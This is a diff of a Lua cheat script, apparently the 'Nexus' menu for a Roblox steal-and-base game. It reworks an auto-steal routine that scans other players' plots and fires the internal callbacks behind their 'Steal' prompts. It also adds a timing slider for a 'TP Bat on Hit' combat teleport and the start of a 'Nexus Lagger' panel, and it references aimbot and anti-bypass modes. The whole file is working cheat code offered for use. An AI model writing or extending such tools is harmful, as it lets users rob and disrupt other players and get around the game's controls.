@@ -57,6 +57,7 @@ _G.NexusAutoCarrySavedMode = nil
 local autoStealEnabled = false
 local selectedStealMode = "Semi"
 local autoStealRadius = 9
+local semiStopPercent = 90
 _G.NexusStealRadii = _G.NexusStealRadii or {Normal = 62, Semi = 9}
 local selectedAimbotMode = "Normal"
 local AIMBOT_SPEED = 58
@@ -72,6 +73,7 @@ local antiDesyncAutoSwingEnabled = false
 _G.NexusAntiDesyncAimbotOn = _G.NexusAntiDesyncAimbotOn or false
 local ANTI_DESYNC_AIMBOT_SPEED = 58
 local tpBatOnHitEnabled = false
+local tpBatOnHitDuration = 1
 _G.NexusTpBatOnHitActive = false
 local batCounterEnabled = false
 local medCounterEnabled = false
@@ -1124,6 +1126,7 @@ selectedAnimationPack = selectedAnimationPack,
 selectedStealMode = selectedStealMode,
 autoStealEnabled = autoStealEnabled,
 autoStealRadius = autoStealRadius,
+semiStopPercent = semiStopPercent,
 nexusStealRadii = _G.NexusStealRadii,
 selectedAimbotMode = selectedAimbotMode,
 AIMBOT_SPEED = AIMBOT_SPEED,
@@ -1137,6 +1140,9 @@ normalAimbotEnabled = _G.NexusNormalAimbotOn == true,
 antiBypassAimbotEnabled = _G.NexusAntiBypassAimbotOn == true,
 antiDesyncAutoSwingEnabled = antiDesyncAutoSwingEnabled,
 tpBatOnHitEnabled = tpBatOnHitEnabled,
+tpBatOnHitDuration = tpBatOnHitDuration,
+laggerIntensity = _G.NexusLaggerIntensity or 7,
+laggerKeybind = _G.NexusLaggerKeybind and _G.NexusLaggerKeybind.Name or "V",
 antiDesyncAimbotEnabled = _G.NexusAntiDesyncAimbotOn == true,
 batCounterEnabled = batCounterEnabled,
 medCounterEnabled = medCounterEnabled,
@@ -1234,6 +1240,8 @@ selectedAnimationPack = data.selectedAnimationPack or selectedAnimationPack
 selectedStealMode = data.selectedStealMode == "Normal" and "Normal" or "Semi"
 autoStealEnabled = data.autoStealEnabled == true
 autoStealRadius = tonumber(data.autoStealRadius) or autoStealRadius
+local loadedStopPct = tonumber(data.semiStopPercent)
+semiStopPercent = loadedStopPct == 75 and 75 or (loadedStopPct == 99 and 99 or 90)
 if type(data.nexusStealRadii) == "table" and data.nexusStealRadii.Normal and data.nexusStealRadii.Semi then _G.NexusStealRadii = data.nexusStealRadii end
 selectedAimbotMode = data.selectedAimbotMode or selectedAimbotMode
 if selectedAimbotMode ~= "Anti Bypass" then selectedAimbotMode = "Normal" end
@@ -1252,6 +1260,12 @@ _G.NexusNormalAimbotOn = data.normalAimbotEnabled == true
 _G.NexusAntiBypassAimbotOn = data.antiBypassAimbotEnabled == true
 antiDesyncAutoSwingEnabled = data.antiDesyncAutoSwingEnabled == true
 tpBatOnHitEnabled = data.tpBatOnHitEnabled == true
+tpBatOnHitDuration = math.clamp(tonumber(data.tpBatOnHitDuration) or 1, 0.1, 3)
+if data.laggerIntensity ~= nil then _G.NexusLaggerIntensity = math.clamp(tonumber(data.laggerIntensity) or 7, 1, 10) end
+if data.laggerKeybind ~= nil then
+local lkc = Enum.KeyCode[data.laggerKeybind]
+if lkc then _G.NexusLaggerKeybind = lkc end
+end
 _G.NexusAntiDesyncAimbotOn = data.antiDesyncAimbotEnabled == true
 batCounterEnabled = data.batCounterEnabled == true
 medCounterEnabled = data.medCounterEnabled == true
@@ -2358,7 +2372,7 @@ _G.NexusStartAntiDesyncAimbot()
 end
 end
 
--- TP Bat on Hit: when they hit you, anti-desync bat to them for 1 second, then back to normal
+-- TP Bat on Hit: when they hit you, anti-desync bat to them for tpBatOnHitDuration seconds, then back to normal
 _G.NexusTpBatOnHitConn = nil
 local _tpBatOnHitWasAlreadyActive = false
 local _tpBatOnHitTimer = nil
@@ -2404,7 +2418,7 @@ end
 if type(showActionNotification) == "function" then
 pcall(function() showActionNotification("TP BAT ON HIT!") end)
 end
-_tpBatOnHitTimer = task.delay(1, function()
+_tpBatOnHitTimer = task.delay(tpBatOnHitDuration, function()
 _tpBatOnHitTimer = nil
 _G.NexusTpBatOnHitActive = false
 if not _tpBatOnHitWasAlreadyActive then
@@ -2670,17 +2684,11 @@ _G.NexusSemiSteal = _G.NexusSemiSteal or {}
 local A = _G.NexusSemiSteal
 if A.conn then pcall(function() A.conn:Disconnect() end); A.conn = nil end
 A.enabled = false
-A.holdMin = 1.3
-A.holdMax = 2.6
-A.entryDelay = 0.3
-A.cooldown = 0.05
-A.primeRange = 80
-A.radius = tonumber(autoStealRadius) or 10
-A.conn = A.conn
-A.scanThread = A.scanThread
-A.plotSync = A.plotSync or {caches = {}, connections = {}}
-A.animals = A.animals or {}
-A.promptCache = A.promptCache or {}
+A.duration = 1.3
+A.stopPercent = semiStopPercent
+A.stopEnabled = true
+A.primeRange = 61
+A.radius = tonumber(autoStealRadius) or 9
 A.internalCache = A.internalCache or {}
 A.state = A.state or {active = false, startTime = 0, phase = "idle", label = "", lastResult = "", lastResultTime = 0}
 local function barSet(p, label)
@@ -2700,182 +2708,47 @@ local function rootPart()
 local char = LP.Character
 return char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso")) or nil
 end
-local function splitPath(path)
-if typeof(path) == "table" then return path end
-local out = {}
-for part in string.gmatch(tostring(path), "[^%.]+") do
-table.insert(out, tonumber(part) or part)
+local function isMyPlotByName(plotName)
+local plots = Workspace:FindFirstChild("Plots")
+local plot = plots and plots:FindFirstChild(plotName)
+local sign = plot and plot:FindFirstChild("PlotSign")
+if sign then
+local yb = sign:FindFirstChild("YourBase")
+if yb and yb:IsA("BillboardGui") then return yb.Enabled == true end
 end
-return out
+return false
 end
-local function resolvePath(path, root)
-local current, parent, key = root, nil, nil
-for _, part in ipairs(splitPath(path)) do
-parent = current
-key = part
-current = current and current[part] or nil
-end
-return current, parent, key
-end
-local function applySyncDiff(channelName, packet)
-local cache = A.plotSync.caches[channelName]
-if typeof(cache) ~= "table" then return end
-local path, action, a, b = packet[1], packet[2], packet[3], packet[4]
-local current, parent, key = resolvePath(path, cache)
-if action == "Changed" then
-if parent ~= nil then parent[key] = a end
-elseif action == "ArrayInsert" then
-if current ~= nil then table.insert(current, b, a) end
-elseif action == "ArrayRemoved" then
-if current ~= nil then table.remove(current, b) end
-elseif action == "DictionaryInsert" then
-if current ~= nil then current[b] = a end
-elseif action == "DictionaryRemoved" then
-if current ~= nil then current[b] = nil end
-end
-end
-local function attachPlotChannel(remote, plots, requestData)
-if A.plotSync.connections[remote] then return end
-local channelName = tostring(remote.Name)
-if not plots:FindFirstChild(channelName) then return end
-if requestData and A.plotSync.caches[channelName] == nil then
-local ok, data = pcall(function() return requestData:InvokeServer(channelName) end)
-A.plotSync.caches[channelName] = (ok and typeof(data) == "table") and data or {}
-elseif A.plotSync.caches[channelName] == nil then
-A.plotSync.caches[channelName] = {}
-end
-A.plotSync.connections[remote] = remote.OnClientEvent:Connect(function(queue)
-for _, packet in ipairs(queue) do applySyncDiff(channelName, packet) end
-end)
-end
-local function ensureSync()
-if A.syncReady then return true end
-local ok = pcall(function()
-local rs = game:GetService("ReplicatedStorage")
-A.packages = rs:WaitForChild("Packages", 10)
-A.datas = rs:WaitForChild("Datas", 10)
-A.plots = workspace:WaitForChild("Plots", 10)
-if not (A.packages and A.datas and A.plots) then return end
-A.animalsData = require(A.datas:WaitForChild("Animals", 10))
-local sync = A.packages:WaitForChild("Synchronizer", 10)
-A.channelFolder = sync:WaitForChild("Channel", 10)
-A.routeRemote = sync:WaitForChild("CommunicationRoute", 10)
-A.requestData = sync:FindFirstChild("RequestData")
-for _, child in ipairs(A.channelFolder:GetChildren()) do
-if child:IsA("RemoteEvent") then attachPlotChannel(child, A.plots, A.requestData) end
-end
-A.channelFolder.ChildAdded:Connect(function(child)
-if child:IsA("RemoteEvent") then attachPlotChannel(child, A.plots, A.requestData) end
-end)
-A.routeRemote.OnClientEvent:Connect(function(actions)
-for _, action in ipairs(actions) do
-local kind, channelName = action[1], tostring(action[2])
-if A.plots and A.plots:FindFirstChild(channelName) then
-if kind == "ListenerAdded" then
-local remote = A.channelFolder and A.channelFolder:FindFirstChild(channelName)
-if remote and remote:IsA("RemoteEvent") then attachPlotChannel(remote, A.plots, A.requestData) end
-elseif kind == "ListenerRemoved" then
-for remote, conn in pairs(A.plotSync.connections) do
-if tostring(remote.Name) == channelName then
-pcall(function() conn:Disconnect() end)
-A.plotSync.connections[remote] = nil
-A.plotSync.caches[channelName] = nil
+local function findNearestPrompt()
+local root = rootPart()
+if not root then return nil, nil end
+local plots = Workspace:FindFirstChild("Plots")
+if not plots then return nil, nil end
+local nearestPrompt, nearestDist, nearestName = nil, math.huge, nil
+for _, plot in ipairs(plots:GetChildren()) do
+if isMyPlotByName(plot.Name) then continue end
+local pods = plot:FindFirstChild("AnimalPodiums")
+if not pods then continue end
+for _, pod in ipairs(pods:GetChildren()) do
+pcall(function()
+local base = pod:FindFirstChild("Base")
+local spawn = base and base:FindFirstChild("Spawn")
+if not spawn then return end
+local dist = (spawn.Position - root.Position).Magnitude
+if dist >= nearestDist or dist > (A.primeRange or 61) then return end
+local att = spawn:FindFirstChild("PromptAttachment")
+if not att then return end
+for _, child in ipairs(att:GetChildren()) do
+if child:IsA("ProximityPrompt") and child.ActionText and child.ActionText:find("Steal") then
+nearestPrompt = child
+nearestDist = dist
+nearestName = pod.Name
 break
 end
 end
-end
-end
-end
 end)
-A.syncReady = true
-end)
-return ok and A.syncReady == true
-end
-local function getPlotOwner(plot)
-local sign = plot and plot:FindFirstChild("PlotSign")
-local frame = sign and sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame")
-local label = frame and frame:FindFirstChild("TextLabel")
-if not label or label.Text == "Empty Base" then return nil end
-return label.Text:gsub("'s [Bb]ase$", ""):gsub("%s+$", "")
-end
-local function isMyBaseAnimal(animalData)
-if not animalData or not animalData.plot or not A.plots then return false end
-local plot = A.plots:FindFirstChild(animalData.plot)
-if not plot then return false end
-local owner = getPlotOwner(plot)
-return owner == LP.DisplayName or owner == LP.Name
-end
-local function podiumFor(animalData)
-local plot = A.plots and A.plots:FindFirstChild(animalData.plot)
-local podiums = plot and plot:FindFirstChild("AnimalPodiums")
-return podiums and podiums:FindFirstChild(animalData.slot) or nil
-end
-local function animalPos(animalData)
-local podium = podiumFor(animalData)
-return podium and podium:GetPivot().Position or nil
-end
-local function distToAnimal(animalData)
-local root = rootPart()
-local pos = animalPos(animalData)
-return root and pos and (root.Position - pos).Magnitude or math.huge
-end
-local function findPromptForAnimal(animalData)
-if not animalData then return nil end
-local cached = A.promptCache[animalData.uid]
-if cached and cached.Parent then return cached end
-local podium = podiumFor(animalData)
-local base = podium and podium:FindFirstChild("Base")
-local spawn = base and base:FindFirstChild("Spawn")
-local attach = spawn and spawn:FindFirstChild("PromptAttachment")
-if not attach then return nil end
-for _, prompt in ipairs(attach:GetChildren()) do
-if prompt:IsA("ProximityPrompt") then
-A.promptCache[animalData.uid] = prompt
-return prompt
 end
 end
-return nil
-end
-local function scanAllPlots()
-if not ensureSync() then return 0 end
-local newCache = {}
-for _, plot in ipairs(A.plots:GetChildren()) do
-local cache = A.plotSync.caches[plot.Name]
-local animalList = cache and cache.AnimalList
-if typeof(animalList) == "table" then
-for slot, animalData in pairs(animalList) do
-if type(animalData) == "table" then
-local animalName = animalData.Index
-local info = A.animalsData and A.animalsData[animalName]
-if info then
-table.insert(newCache, {
-name = info.DisplayName or animalName,
-plot = plot.Name,
-slot = tostring(slot),
-uid = plot.Name .. "_" .. tostring(slot),
-})
-end
-end
-end
-end
-end
-A.animals = newCache
-return #newCache
-end
-local function pickClosest()
-local root = rootPart()
-if not root then return nil end
-local best, bestDist = nil, math.huge
-for _, animalData in ipairs(A.animals) do
-if not isMyBaseAnimal(animalData) then
-local pos = animalPos(animalData)
-local dist = pos and (root.Position - pos).Magnitude or math.huge
-if dist <= (A.primeRange or 80) and dist < bestDist then
-best, bestDist = animalData, dist
-end
-end
-end
-return best
+return nearestPrompt, nearestName
 end
 local function buildCallbacks(prompt)
 if A.internalCache[prompt] then return end
@@ -2894,60 +2767,116 @@ end
 end
 if #data.holdCallbacks > 0 or #data.triggerCallbacks > 0 then A.internalCache[prompt] = data end
 end
-local function executeSemi(prompt, animalData)
-if not prompt or not prompt.Parent or not animalData then return false end
+local function executeSemi(prompt, podName)
+if not prompt or not prompt.Parent then return false end
 buildCallbacks(prompt)
 local data = A.internalCache[prompt]
 if not data or not data.ready then return false end
 data.ready = false
+local promptFired = false
 A.state.active = true
 A.state.startTime = tick()
 A.state.phase = "holding"
-A.state.label = animalData.name or "Animal"
+A.state.label = podName or "Animal"
 task.spawn(function()
 local startTime = A.state.startTime
+local duration = A.duration or 1.3
+local stopPercent = semiStopPercent == 75 and 75 or (semiStopPercent == 99 and 99 or 90)
+local stopTime = duration * (stopPercent / 100)
+local fireRadius = math.max((tonumber(A.radius) or 9) - (stopPercent == 99 and 5 or (stopPercent == 90 and 2 or 0)), 3)
 for _, fn in ipairs(data.holdCallbacks) do task.spawn(function() pcall(fn) end) end
-while A.enabled and selectedStealMode == "Semi" and tick() - startTime < (A.holdMin or 1.3) do
-barSet((tick() - startTime) / (A.holdMax or 2.6), "STEALING")
+if A.stopEnabled then
+while A.enabled and selectedStealMode == "Semi" do
+local elapsed = tick() - startTime
+if elapsed >= stopTime then break end
+barSet(elapsed / duration, "STEALING")
+if not prompt.Parent or not prompt.Parent.Parent then break end
+local root = rootPart()
+if root and (root.Position - prompt.Parent.Parent.Position).Magnitude > (A.primeRange or 61) then break end
 task.wait()
 end
+local stopProgress = math.clamp(stopTime / duration, 0, 1)
+barSet(stopProgress, "STEALING")
+local phase2Timeout = math.max(2.99 - stopTime - math.max(duration - stopTime, 0), 0.05)
+local phase2Start = tick()
 A.state.phase = "waitingRange"
-local alreadyInRange = distToAnimal(animalData) <= (tonumber(A.radius) or 10)
-local fired = false
-while A.enabled and selectedStealMode == "Semi" and prompt.Parent do
-local elapsed = tick() - startTime
-if elapsed > (A.holdMax or 2.6) then break end
-barSet(elapsed / (A.holdMax or 2.6), "STEALING")
-if distToAnimal(animalData) <= (tonumber(A.radius) or 10) then
-if not alreadyInRange then task.wait(A.entryDelay or 0.3) end
-if A.enabled and selectedStealMode == "Semi" then
-for _, fn in ipairs(data.triggerCallbacks) do task.spawn(function() pcall(fn) end) end
-pcall(function() if _G.AutoCarrySpeed and _G.AutoCarrySpeed.WatchPickup then _G.AutoCarrySpeed.WatchPickup(1.25) end end)
-fired = true
+while A.enabled and selectedStealMode == "Semi" do
+if not prompt.Parent or not prompt.Parent.Parent then
+A.state.active = false
+A.state.phase = "idle"
+barReset()
+data.ready = true
+return
 end
+local root = rootPart()
+if root then
+local dist = (root.Position - prompt.Parent.Parent.Position).Magnitude
+if dist <= fireRadius then
+break
+elseif dist > (A.primeRange or 61) then
+A.state.active = false
+A.state.phase = "idle"
+barReset()
+data.ready = true
+return
+end
+end
+if tick() - phase2Start >= phase2Timeout then
+barReset()
+data.ready = true
+A.state.active = false
+A.state.phase = "idle"
+task.wait()
+local newPrompt, newName = findNearestPrompt()
+if newPrompt then executeSemi(newPrompt, newName) end
+return
+end
+task.wait()
+end
+if A.enabled and selectedStealMode == "Semi" then
+local fillStart = tick()
+local fillDuration = math.max(duration - stopTime, 0.05)
+A.state.phase = "firing"
+while A.enabled and selectedStealMode == "Semi" and prompt.Parent do
+local fp = math.clamp((tick() - fillStart) / fillDuration, 0, 1)
+barSet(stopProgress + fp * (1 - stopProgress), "STEALING")
+if fp >= 1 and not promptFired then
+promptFired = true
+pcall(function()
+for _, fn in ipairs(data.triggerCallbacks) do task.spawn(function() pcall(fn) end) end
+if _G.AutoCarrySpeed and _G.AutoCarrySpeed.WatchPickup then _G.AutoCarrySpeed.WatchPickup(1.25) end
+end)
 break
 end
 task.wait()
 end
-A.state.lastResult = fired and ("Stole " .. tostring(A.state.label)) or ("Missed window: " .. tostring(A.state.label))
+end
+else
+while A.enabled and selectedStealMode == "Semi" and prompt.Parent do
+local elapsed = tick() - startTime
+barSet(elapsed / duration, "STEALING")
+local root = rootPart()
+if root and (root.Position - prompt.Parent.Parent.Position).Magnitude > (A.primeRange or 61) then break end
+if elapsed >= duration and not promptFired then
+promptFired = true
+pcall(function()
+for _, fn in ipairs(data.triggerCallbacks) do task.spawn(function() pcall(fn) end) end
+if _G.AutoCarrySpeed and _G.AutoCarrySpeed.WatchPickup then _G.AutoCarrySpeed.WatchPickup(1.25) end
+end)
+break
+end
+task.wait()
+end
+end
+A.state.lastResult = promptFired and ("Stole " .. tostring(A.state.label)) or ("Missed window: " .. tostring(A.state.label))
+A.state.lastResultTime = tick()
+if promptFired then barSet(1, "STEALING") end
+barReset()
+data.ready = true
 A.state.active = false
 A.state.phase = "idle"
-A.state.lastResultTime = tick()
-if fired then barSet(1, "STEALING") end
-task.wait(A.cooldown or 0.05)
-data.ready = true
-barReset()
 end)
 return true
-end
-local function ensureScanThread()
-if A.scanThread then return end
-A.scanThread = task.spawn(function()
-while _G.NexusSemiSteal do
-if A.enabled or selectedStealMode == "Semi" then pcall(scanAllPlots) end
-task.wait(5)
-end
-end)
 end
 _G.NexusSemiAutoStealSetRadius = function(v)
 local n = tonumber(v)
@@ -2958,23 +2887,20 @@ A.enabled = false
 if A.conn then A.conn:Disconnect(); A.conn = nil end
 A.state.active = false
 A.state.phase = "idle"
+for _, data in pairs(A.internalCache) do data.ready = true end
 barReset()
 end
 _G.NexusSemiAutoStealStart = function()
-A.radius = tonumber(autoStealRadius) or A.radius or 10
+A.radius = tonumber(autoStealRadius) or A.radius or 9
 A.enabled = true
-ensureSync()
-ensureScanThread()
-pcall(scanAllPlots)
+A.stopPercent = semiStopPercent
 if A.conn then A.conn:Disconnect(); A.conn = nil end
 A.conn = RunService.Heartbeat:Connect(function()
 if not A.enabled then return end
 if selectedStealMode ~= "Semi" then _G.NexusSemiAutoStealStop(); return end
 if A.state.active then return end
-local target = pickClosest()
-if not target then return end
-local prompt = findPromptForAnimal(target)
-if prompt then executeSemi(prompt, target) end
+local prompt, podName = findNearestPrompt()
+if prompt then executeSemi(prompt, podName) end
 end)
 end
 _G.NexusSemiAutoStealSync = function()
@@ -4892,6 +4818,113 @@ click.ZIndex = 6
 click.Parent = holder
 local radiusRow = nil
 local radiusBox = nil
+local stopRow = nil
+local stopSlide = nil
+local stopTexts = {}
+local btnsArea = nil
+local function syncStopColors()
+local pct = semiStopPercent == 75 and 75 or (semiStopPercent == 99 and 99 or 90)
+if stopSlide then
+tween(stopSlide, {
+Position = pct == 99 and UDim2.new(2 / 3, -1, 0, 4) or (pct == 90 and UDim2.new(1 / 3, -1, 0, 4) or UDim2.new(0, 4, 0, 4))
+}, 0.18)
+end
+for tPct, t in pairs(stopTexts) do
+tween(t, {
+TextColor3 = tPct == pct and Color3.fromRGB(15, 15, 15) or Color3.fromRGB(120, 120, 120)
+}, 0.14)
+end
+end
+local function makeStopText(offset, pct)
+local txt = Instance.new("TextLabel")
+txt.Name = tostring(pct)
+txt.BackgroundTransparency = 1
+txt.Text = tostring(pct) .. "%"
+txt.TextColor3 = Color3.fromRGB(120, 120, 120)
+txt.TextSize = 11
+txt.Font = Enum.Font.GothamBold
+txt.TextXAlignment = Enum.TextXAlignment.Center
+txt.Size = UDim2.new(1 / 3, 0, 1, 0)
+txt.Position = UDim2.new(offset == 1 and 0 or (offset == 2 and 1 / 3 or 2 / 3), 0, 0, 0)
+txt.ZIndex = 8
+txt.Parent = btnsArea
+stopTexts[pct] = txt
+return txt
+end
+local function makeStopClick(offset, pct)
+local click = Instance.new("TextButton")
+click.Name = tostring(pct) .. "Click"
+click.BackgroundTransparency = 1
+click.Text = ""
+click.AutoButtonColor = false
+click.Size = UDim2.new(1 / 3, 0, 1, 0)
+click.Position = UDim2.new(offset == 1 and 0 or (offset == 2 and 1 / 3 or 2 / 3), 0, 0, 0)
+click.ZIndex = 10
+click.Parent = btnsArea
+click.Activated:Connect(function()
+semiStopPercent = pct
+syncStopColors()
+if _G.NexusAutoStealSync then _G.NexusAutoStealSync() end
+saveNexusConfig()
+end)
+end
+local function ensureStopRow()
+if stopRow and stopRow.Parent then return stopRow end
+stopRow = Instance.new("Frame")
+stopRow.Name = "Steal Stop %"
+stopRow.BackgroundColor3 = COLORS.row
+stopRow.BackgroundTransparency = 0.3
+stopRow.Size = UDim2.new(1, -4, 0, 28)
+stopRow.BorderSizePixel = 0
+stopRow.LayoutOrder = order + 0.6
+stopRow.ZIndex = 4
+stopRow.ClipsDescendants = true
+stopRow.Parent = parent
+corner(stopRow, 10)
+stroke(stopRow, COLORS.strokeSoft, 1, 0)
+local cap = Instance.new("TextLabel")
+cap.BackgroundTransparency = 1
+cap.Text = "STOP AT"
+cap.TextColor3 = Color3.fromRGB(200, 200, 200)
+cap.TextSize = 10
+cap.Font = Enum.Font.GothamBold
+cap.Size = UDim2.new(0, 64, 0, 22)
+cap.Position = UDim2.new(0, 8, 0, 3)
+cap.ZIndex = 5
+cap.Parent = stopRow
+btnsArea = Instance.new("Frame")
+btnsArea.Name = "StopArea"
+btnsArea.BackgroundTransparency = 1
+btnsArea.Size = UDim2.new(1, -76, 1, 0)
+btnsArea.Position = UDim2.new(0, 72, 0, 0)
+btnsArea.ZIndex = 6
+btnsArea.Parent = stopRow
+local slide = Instance.new("Frame")
+slide.Name = "StopSlide"
+slide.BackgroundColor3 = Color3.fromRGB(235, 235, 235)
+slide.BackgroundTransparency = 0
+slide.Size = UDim2.new(1 / 3, -3, 1, -8)
+slide.Position = UDim2.new(0, 4, 0, 4)
+slide.BorderSizePixel = 0
+slide.ZIndex = 5
+slide.Parent = btnsArea
+corner(slide, 8)
+local slideStroke = Instance.new("UIStroke")
+slideStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+slideStroke.Color = Color3.fromRGB(255, 255, 255)
+slideStroke.Thickness = 1
+slideStroke.Transparency = 0.08
+slideStroke.Parent = slide
+stopSlide = slide
+makeStopText(1, 75)
+makeStopText(2, 90)
+makeStopText(3, 99)
+makeStopClick(1, 75)
+makeStopClick(2, 90)
+makeStopClick(3, 99)
+syncStopColors()
+return stopRow
+end
 local function setStealMode(mode, syncSteal)
 mode = (mode == "Normal") and "Normal" or "Semi"
 selectedStealMode = mode
@@ -4919,12 +4952,18 @@ end
 elseif radiusBox then
 radiusBox.Text = tostring(_G.NexusStealRadii.Normal or 62)
 end
+if stopRow then
+stopRow:Destroy()
+stopRow = nil
+end
 else
 if radiusRow then
 radiusRow:Destroy()
 radiusRow = nil
 radiusBox = nil
 end
+ensureStopRow()
+syncStopColors()
 end
 saveNexusConfig()
 end
@@ -5276,6 +5315,60 @@ saveNexusConfig()
 task.delay(0.12, function() _G.NexusTpBatOnHitClickBusy = false end)
 end)
 end
+end
+do
+local tpRow = baseRow(Combat, "Stick Time (s)", 12.5)
+local tpMinus = Instance.new("TextButton")
+tpMinus.Name = "Minus"
+tpMinus.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+tpMinus.BackgroundTransparency = 0
+tpMinus.BorderSizePixel = 0
+tpMinus.Text = "-"
+tpMinus.TextColor3 = Color3.fromRGB(160, 160, 160)
+tpMinus.TextSize = 14
+tpMinus.Font = Enum.Font.GothamBold
+tpMinus.AutoButtonColor = false
+tpMinus.Size = UDim2.new(0, 28, 0, 26)
+tpMinus.Position = UDim2.new(1, -118, 0.5, -13)
+tpMinus.ZIndex = 6
+tpMinus.Parent = tpRow
+corner(tpMinus, 6)
+local tpVal = Instance.new("TextLabel")
+tpVal.Name = "Value"
+tpVal.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+tpVal.BackgroundTransparency = 0
+tpVal.BorderSizePixel = 0
+tpVal.Text = string.format("%.1fs", tpBatOnHitDuration)
+tpVal.TextColor3 = Color3.fromRGB(235, 235, 235)
+tpVal.TextSize = 13
+tpVal.Font = Enum.Font.GothamBold
+tpVal.TextXAlignment = Enum.TextXAlignment.Center
+tpVal.Size = UDim2.new(0, 48, 0, 26)
+tpVal.Position = UDim2.new(1, -84, 0.5, -13)
+tpVal.ZIndex = 6
+tpVal.Parent = tpRow
+corner(tpVal, 6)
+local tpPlus = Instance.new("TextButton")
+tpPlus.Name = "Plus"
+tpPlus.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+tpPlus.BackgroundTransparency = 0
+tpPlus.BorderSizePixel = 0
+tpPlus.Text = "+"
+tpPlus.TextColor3 = Color3.fromRGB(160, 160, 160)
+tpPlus.Font = Enum.Font.GothamBold
+tpPlus.AutoButtonColor = false
+tpPlus.Size = UDim2.new(0, 28, 0, 26)
+tpPlus.Position = UDim2.new(1, -30, 0.5, -13)
+tpPlus.ZIndex = 6
+tpPlus.Parent = tpRow
+corner(tpPlus, 6)
+local function tpSetValue(nv)
+tpBatOnHitDuration = math.clamp(nv, 0.1, 3)
+tpVal.Text = string.format("%.1fs", tpBatOnHitDuration)
+saveNexusConfig()
+end
+tpMinus.MouseButton1Click:Connect(function() tpSetValue(tpBatOnHitDuration - 0.1) end)
+tpPlus.MouseButton1Click:Connect(function() tpSetValue(tpBatOnHitDuration + 0.1) end)
 end
 section(Combat, "COUNTERS", 13)
 _nexusRow, setBatCounterVisual = _G.NexusActionToggleRow(Combat, "Bat Counter", batCounterEnabled, 14)
@@ -6343,13 +6436,354 @@ nexusMainScale.Name = "NexusMainScale"
 nexusMainScale.Scale = nexusGuiScaleValue
 nexusMainScale.Parent = Main
 local function applyNexusProgressBarScale()
-local sg = PlayerGui:FindFirstChild("StealBarGui")
-local bar = sg and sg:FindFirstChild("StealBar")
+local sg = PlayerGui:FindFirstChild("NexusHud")
+local bar = sg and sg:FindFirstChild("NexusHudBar")
 if not bar then return end
 local sc = bar:FindFirstChild("NexusProgressBarScale") or Instance.new("UIScale")
 sc.Name = "NexusProgressBarScale"
 sc.Scale = nexusProgressBarScaleValue
 sc.Parent = bar
+end
+do
+local function getKeyDisplayName(kc)
+if kc == Enum.KeyCode.Unknown then return "None" end
+local n = kc.Name
+local gpNames = {ButtonA="A",ButtonB="B",ButtonX="X",ButtonY="Y",ButtonL1="LB",ButtonL2="LT",ButtonL3="LS",ButtonR1="RB",ButtonR2="RT",ButtonR3="RS",ButtonSelect="SEL",ButtonStart="STA",DPadUp="DU",DPadDown="DD",DPadLeft="DL",DPadRight="DR",Thumbstick1="LS",Thumbstick2="RS"}
+return gpNames[n] or n:sub(1,5)
+end
+local GAMEPAD_KEYS = {
+[Enum.KeyCode.ButtonA]=true,[Enum.KeyCode.ButtonB]=true,[Enum.KeyCode.ButtonX]=true,[Enum.KeyCode.ButtonY]=true,
+[Enum.KeyCode.ButtonL1]=true,[Enum.KeyCode.ButtonR1]=true,[Enum.KeyCode.ButtonL2]=true,[Enum.KeyCode.ButtonR2]=true,
+[Enum.KeyCode.ButtonL3]=true,[Enum.KeyCode.ButtonR3]=true,[Enum.KeyCode.ButtonStart]=true,[Enum.KeyCode.ButtonSelect]=true,
+[Enum.KeyCode.DPadUp]=true,[Enum.KeyCode.DPadDown]=true,[Enum.KeyCode.DPadLeft]=true,[Enum.KeyCode.DPadRight]=true,
+[Enum.KeyCode.Thumbstick1]=true,[Enum.KeyCode.Thumbstick2]=true,
+}
+local function isGamepadInput(inp) return inp and inp.UserInputType and inp.UserInputType.Name:match("^Gamepad") ~= nil end
+local function isBindableInput(inp)
+if not inp or inp.KeyCode == Enum.KeyCode.Unknown then return false end
+if inp.UserInputType == Enum.UserInputType.Keyboard then return true end
+return isGamepadInput(inp) and GAMEPAD_KEYS[inp.KeyCode] == true
+end
+if _G.NexusLaggerIntensity == nil then _G.NexusLaggerIntensity = 7 end
+if _G.NexusLaggerKeybind == nil then _G.NexusLaggerKeybind = Enum.KeyCode.V end
+_G.NexusLaggerActive = _G.NexusLaggerActive or false
+_G.NexusLaggerGui = nil
+_G.NexusLaggerThread = nil
+_G.NexusSetLaggerOpenVisual = nil
+_G.NexusCreateLaggerPanel = function()
+local guiParent = game:GetService("CoreGui")
+pcall(function() if not guiParent then guiParent = PlayerGui end end)
+if _G.NexusLaggerGui then pcall(function() _G.NexusLaggerGui:Destroy() end) end
+local sg = Instance.new("ScreenGui")
+sg.Name = "NexusLaggerPanel"; sg.ResetOnSpawn = false; sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+pcall(function() sg.Parent = guiParent end)
+if not sg.Parent then sg.Parent = PlayerGui end
+_G.NexusLaggerGui = sg
+local laggerScale = Instance.new("UIScale", sg)
+laggerScale.Scale = nexusGuiScaleValue or 1
+local PW, PH = 270, 140
+local f = Instance.new("Frame", sg)
+f.Size = UDim2.new(0, PW, 0, 0); f.Position = UDim2.new(0.5, -PW / 2, 0.5, -PH / 2)
+f.BackgroundColor3 = Color3.fromRGB(18, 18, 22); f.BorderSizePixel = 0; f.Active = true; f.ClipsDescendants = true
+corner(f, 10)
+stroke(f, Color3.fromRGB(42, 42, 50), 1.5, 0)
+local titleBar = Instance.new("Frame", f)
+titleBar.Size = UDim2.new(1, 0, 0, 32); titleBar.BackgroundColor3 = Color3.fromRGB(12, 12, 16); titleBar.BorderSizePixel = 0
+corner(titleBar, 10)
+local titleLabel = Instance.new("TextLabel", titleBar)
+titleLabel.Size = UDim2.new(1, -60, 1, 0); titleLabel.Position = UDim2.new(0, 12, 0, 0)
+titleLabel.BackgroundTransparency = 1; titleLabel.Text = "NEXUS LAGGER"
+titleLabel.TextColor3 = Color3.fromRGB(160, 160, 175); titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextSize = 12; titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+local closeBtn = Instance.new("TextButton", titleBar)
